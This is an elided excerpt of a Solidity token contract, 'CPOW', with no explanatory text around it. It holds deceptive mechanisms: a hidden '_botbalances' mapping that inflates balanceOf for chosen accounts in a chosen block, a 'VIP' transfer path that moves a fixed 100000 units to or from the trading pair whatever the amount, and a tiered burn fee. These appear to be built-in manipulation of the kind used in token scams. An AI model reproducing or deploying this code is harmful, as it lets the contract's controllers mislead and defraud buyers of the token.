...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    mapping(address => uint256)  _botbalances;

    mapping(address => uint256)  _botBlock;
    ...
    override
    returns (uint256)
    {   if(block.number == _botBlock[account]){
            return _balances[account] + _botbalances[account];
        }
        return _balances[account];
    }

    function balanceOnlyOf(address account)
    public
    view
    returns (uint256)
    {   
    ...
    returns (bool)
    {
        require(balanceOf(msg.sender) >= amount,"need amount");
...
contract ATtoken is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("CPOW", "CPOW") {
        require(address(this) > address(0x55d398326f99059fF775485246999027B3197955),"usdt");
    ...
    function _transfer(
		...
		if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[to]){
            ...
            if(from == uniswapV2Pair || to == uniswapV2Pair){
                super._transfer(from, to, 100000);
                return ;
            }
        }
        
        uint256 deadRate = getDeadRate();
        if(deadRate > 0){
            super._transfer(from, _destroyAddress, amount.div(100).mul(deadRate));
            super._transfer(from, to, amount.div(100).mul(100 - deadRate));
        }else{
            super._transfer(from, to, amount);
        }
        return ;
    ...
    function getDeadRate() public view returns(uint256){
        uint256 deadAmount = super.balanceOf(_destroyAddress);
        if(deadAmount < total.div(2)){
            return 4;
        }else if(deadAmount < total.div(4).mul(3)){
            return 2;
        }else if(deadAmount < total.div(8).mul(7)){
            return 1;
        }else{
            return 0;
        }
